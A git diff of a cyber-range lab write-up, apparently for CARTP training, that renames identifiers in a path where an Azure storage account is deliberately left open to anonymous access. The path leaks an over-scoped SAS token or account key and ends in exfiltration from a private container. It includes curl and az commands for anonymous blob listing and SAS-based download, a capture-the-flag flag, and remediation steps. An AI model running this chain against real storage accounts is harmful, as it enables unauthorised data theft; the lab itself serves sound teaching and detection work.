@@ -1,16 +1,16 @@
 # AP07 — Anonymous public storage -> over-scoped SAS leak -> private-container exfiltration
 
 - **Layer:** Azure (Storage — blob data plane)
-- **Cost:** **~0 — one of the cheapest Azure infrastructure (ARM) paths in the range (tied with AP08).** Storage account **with no compute / NO VM** + a few KB of blobs (cents) + `StorageBlobLogs` ingestion well below 0.1 GB/day (cents/month, 31-day retention included). `./azrange.ps1 destroy` or `reset` -> 0. It is the **first path that deploys Azure (ARM) resources without billing compute**: the *identity-only* AP01/AP03/AP04 are pure Entra (free, no ARM), and AP02/AP05 do deploy ARM, but **with a VM**.
+- **Cost:** **~0 — one of the cheapest Azure infrastructure (ARM) paths in the range (tied with AP08).** Storage account **with no compute / NO VM** + a few KB of blobs (cents) + `StorageBlobLogs` ingestion well below 0.1 GB/day (cents/month, 31-day retention included). `./aether.ps1 destroy` or `reset` -> 0. It is the **first path that deploys Azure (ARM) resources without billing compute**: the *identity-only* AP01/AP03/AP04 are pure Entra (free, no ARM), and AP02/AP05 do deploy ARM, but **with a VM**.
 - **MITRE ATT&CK:** [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage — *primary*) · [T1619](https://attack.mitre.org/techniques/T1619/) (Cloud Storage Object Discovery) · [T1552.001](https://attack.mitre.org/techniques/T1552/001/) (Unsecured Credentials: Credentials In Files)
 - **Maps to cert:** CARTP (Azure storage plane; data exfiltration)
 - **Precondition seeded by the range** (100% Terraform, `enable_ap07 = true`):
-  - Storage account `azrangeap07<rand>` (output `ap07_storage_account`) with a **deliberately opened double anonymous-access gate**:
+  - Storage account `aetherap07<rand>` (output `ap07_storage_account`) with a **deliberately opened double anonymous-access gate**:
     1. **at the account level** — `allow_nested_items_to_be_public = true`. It is the **exact inverse** of the secure `azurerm_storage_account.dsc` block in the `hybrid-ad` module (which pins it to `false`) -> same `account_tier`/`replication`/`min_tls_version = "TLS1_2"`, with only the public-access property inverted.
     2. **at the container level** — the `public` container with `container_access_type = "container"` (allows anonymously **LISTING** blobs, not just reading them).
   - Public container `public` holding the leaked artifact `backup-config.json`, which embeds an **over-privileged credential** to the private container of the **same account**. By default (`leak_mode = "sas"`) it is an **over-scoped, long-lived account SAS** (up to `sas_expiry_years`, default **10 years**); switchable to `leak_mode = "account_key"`, where what leaks is the raw `primary_access_key` (full control of the account).
-  - Private container `sensitive-data` (`container_access_type = "private"`) with the **crown jewel**: `customers.csv`, **100% synthetic** PII plus the flag `AZRANGE{ap07_public_blob_to_sas_to_private_exfil}`.
-  - **Data-plane** telemetry: an `azurerm_monitor_diagnostic_setting` (`azrange-ap07-blob-diag`) over `.../blobServices/default` -> `StorageBlobLogs` table in `azrange-ap07-law` (output `ap07_law_name`) or in an external Sentinel (`existing_log_analytics_workspace_id`); gated by `collect_storage_logs` (default `true`).
+  - Private container `sensitive-data` (`container_access_type = "private"`) with the **crown jewel**: `customers.csv`, **100% synthetic** PII plus the flag `AETHER{ap07_public_blob_to_sas_to_private_exfil}`.
+  - **Data-plane** telemetry: an `azurerm_monitor_diagnostic_setting` (`aether-ap07-blob-diag`) over `.../blobServices/default` -> `StorageBlobLogs` table in `aether-ap07-law` (output `ap07_law_name`) or in an external Sentinel (`existing_log_analytics_workspace_id`); gated by `collect_storage_logs` (default `true`).
   - **100% declarative: no `seed-ap07.ps1`, no `az vm run-command`, no post-apply hook** — entirely wired by Terraform, **leaked credential included** (embedded via `source_content`): it shares this property with AP02/AP03/AP04 and differs from AP01/AP05, which seed their *payload* with imperative scripts (`seed-ap01.ps1` / `seed-ap05.ps1`). **What is NOT seeded:** any attacker action outside the state (unlike AP02).
 
 > **Warning — the credential lands in the `tfstate`.** The `source_content` of the leaked blob, and —in SAS mode— `data.azurerm_storage_account_sas` + `primary_connection_string` (or, in account_key mode, `primary_access_key` **+** `primary_connection_string`, both embedded in the blob), live in the Terraform state **in cleartext and marked as sensitive**. Treat the `tfstate` as **toxic**, just like the SP *client secret* in AP02 or `dc_admin_password` in AP05. The repo's `.gitignore` already blocks `*.tfstate*`.
@@ -47,7 +47,7 @@ The chain is `anonymous LIST (public) -> anonymous GET (backup-config.json) -> c
 Anonymous access is exercised with **plain HTTP** (curl / REST), not with `az` (which requires an authentication mode). That is exactly the point: *no identity is needed*.
 
 ```bash
-ACCT=azrangeap07<rand>        # = terraform output -raw ap07_storage_account
+ACCT=aetherap07<rand>        # = terraform output -raw ap07_storage_account
 
 # 1. T1619 — LIST the public container anonymously.
 #    Works only if  allow_nested_items_to_be_public=true  AND  container_access_type=container.
@@ -64,13 +64,13 @@ The body of `backup-config.json` depends on `leak_mode`:
 ```jsonc
 // leak_mode = "sas"  (default)
 {
-  "storageAccount": "azrangeap07<rand>",
+  "storageAccount": "aetherap07<rand>",
   "container":      "sensitive-data",
-  "sasUrl":         "https://azrangeap07<rand>.blob.core.windows.net/sensitive-data?sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&sig=<base64...>",
+  "sasUrl":         "https://aetherap07<rand>.blob.core.windows.net/sensitive-data?sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&sig=<base64...>",
   "note":           "nightly backup job connection - rotate before prod"
 }
 // leak_mode = "account_key"  (the blob embeds key + connection string)
-{ "storageAccount": "azrangeap07<rand>", "accountKey": "<primary key base64>", "connectionString": "DefaultEndpointsProtocol=https;AccountName=azrangeap07<rand>;AccountKey=<primary key base64>;EndpointSuffix=core.windows.net", "note": "nightly backup job connection - rotate before prod" }
+{ "storageAccount": "aetherap07<rand>", "accountKey": "<primary key base64>", "connectionString": "DefaultEndpointsProtocol=https;AccountName=aetherap07<rand>;AccountKey=<primary key base64>;EndpointSuffix=core.windows.net", "note": "nightly backup job connection - rotate before prod" }
 ```
 
 > **Caveat — `blob` vs `container` is *load-bearing*.** With `container_access_type = "blob"` an anonymous caller can **read** a blob *if they guess its name*, but **cannot list**. The lab uses `"container"` on purpose so that discovery (T1619) does **not** depend on guessing `backup-config.json`: the `?comp=list` reveals it.
@@ -89,7 +89,7 @@ SAS='sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&
 # List the private container (now signed) and pull the crown jewel:
 curl -s "https://${ACCT}.blob.core.windows.net/sensitive-data?restype=container&comp=list&${SAS}"
 curl -s "https://${ACCT}.blob.core.windows.net/sensitive-data/customers.csv?${SAS}"
-#   -> ...,AZRANGE{ap07_public_blob_to_sas_to_private_exfil}
+#   -> ...,AETHER{ap07_public_blob_to_sas_to_private_exfil}
 
 # Equivalent with az using the SAS token:
 az storage blob download --account-name "$ACCT" --container-name sensitive-data \
@@ -113,12 +113,12 @@ The first two cut the chain **each independently** (defense in depth: closing **
 
 1. **Close the ACCOUNT gate (direct antidote + reset default).** `allow_nested_items_to_be_public = false` — exactly the value of the secure `azurerm_storage_account.dsc` block and the platform default since ~Nov-2023. With the account closed, the container's access level is **ignored**.
    ```bash
-   az storage account update -g azrange-ap07-rg -n azrangeap07<rand> --allow-blob-public-access false
+   az storage account update -g aether-ap07-rg -n aetherap07<rand> --allow-blob-public-access false
    ```
 
 2. **Close the CONTAINER gate.** `container_access_type = "private"` on `public` -> the anonymous `?restype=container&comp=list` turns into `PublicAccessNotPermitted`.
    ```bash
-   az storage container set-permission --account-name azrangeap07<rand> --name public --public-access off
+   az storage container set-permission --account-name aetherap07<rand> --name public --public-access off
    ```
 
 3. **Get the secrets out of the blobs (root of T1552.001).** **Never** credentials in config files. Key Vault + **managed identity** / **workload identity federation** so the backup *job* obtains the credential at *runtime*, not from an artifact at rest.
@@ -137,7 +137,7 @@ The first two cut the chain **each independently** (defense in depth: closing **
 
 Unlike AP05, **there is no `seed-ap07.ps1 -Remediate`**: the path is 100% declarative, so "fixing in-place" means **editing the attribute** (`allow_nested_items_to_be_public = false`, or `container_access_type = "private"`, or `shared_access_key_enabled = false`) and re-applying with `enable_ap07 = true`. The student re-runs Track A and verifies that the anonymous `?comp=list` returns `PublicAccessNotPermitted`.
 
-> **Two reset levels — do not confuse them.** (1) **In-place / pedagogical:** flip one of the vulnerable attributes + `terraform apply` (above) -> leaves the account/telemetry standing to re-test attack and detection against the corrected state. (2) **Hard / cost->0:** `./azrange.ps1 reset` re-applies with `enable_ap07 = false` (`count = 0`) -> Terraform **atomically destroys** RG + account + both containers + **the leaked blob with the credential** + the SAS + the LAW. It is a reset **as clean as AP05's**, and cleaner than AP02/AP03/AP04's: unlike AP02 (where the attacker's *self-grant* is left **outside** the state and must be cleaned by hand), AP07 **has no attacker action outside the state** -> **zero *out-of-state* residue**, zero subsequent cost. (AP05 ties on reset cleanliness, but its ESC1 template is *seeded* with an imperative `run-command`; AP07 is declarative `azurerm` end-to-end, like AP02.)
+> **Two reset levels — do not confuse them.** (1) **In-place / pedagogical:** flip one of the vulnerable attributes + `terraform apply` (above) -> leaves the account/telemetry standing to re-test attack and detection against the corrected state. (2) **Hard / cost->0:** `./aether.ps1 reset` re-applies with `enable_ap07 = false` (`count = 0`) -> Terraform **atomically destroys** RG + account + both containers + **the leaked blob with the credential** + the SAS + the LAW. It is a reset **as clean as AP05's**, and cleaner than AP02/AP03/AP04's: unlike AP02 (where the attacker's *self-grant* is left **outside** the state and must be cleaned by hand), AP07 **has no attacker action outside the state** -> **zero *out-of-state* residue**, zero subsequent cost. (AP05 ties on reset cleanliness, but its ESC1 template is *seeded* with an imperative `run-command`; AP07 is declarative `azurerm` end-to-end, like AP02.)
 
 ---
 
